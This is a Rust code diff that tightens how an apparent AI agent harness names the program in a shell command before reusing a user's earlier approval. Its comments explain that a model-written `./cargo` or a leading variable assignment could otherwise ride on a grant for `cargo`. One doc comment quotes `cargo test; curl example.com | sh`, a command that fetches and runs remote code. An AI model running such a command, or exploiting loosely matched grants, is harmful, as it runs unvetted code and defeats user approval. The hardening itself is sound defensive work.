@@ -318,6 +318,10 @@ fn boundary(text: &str, at: usize) -> usize {
 /// A command that chains, pipes or redirects is reported whole. Its first word
 /// does not describe what it does, and remembering `cargo` from `cargo test`
 /// would then also allow `cargo test; curl example.com | sh`.
+///
+/// The word is reported as the model wrote it, path and all. `cargo` and
+/// `./cargo` are different programs, and a remembered grant that could not tell
+/// them apart would run any file of that name the model had just written.
 fn program(command: &str) -> &str {
     let command = command.trim();
 
@@ -325,11 +329,12 @@ fn program(command: &str) -> &str {
         return command;
     }
 
-    command
-        .split_whitespace()
-        .find(|word| !word.contains('='))
-        .and_then(|word| word.rsplit('/').next())
-        .unwrap_or(command)
+    match command.split_whitespace().next() {
+        // A leading `VAR=value` decides which binary the word after it
+        // resolves to, so that word on its own no longer says what will run.
+        Some(word) if !word.contains('=') => word,
+        _ => command,
+    }
 }
 
 /// An operating-system failure, named for the model.
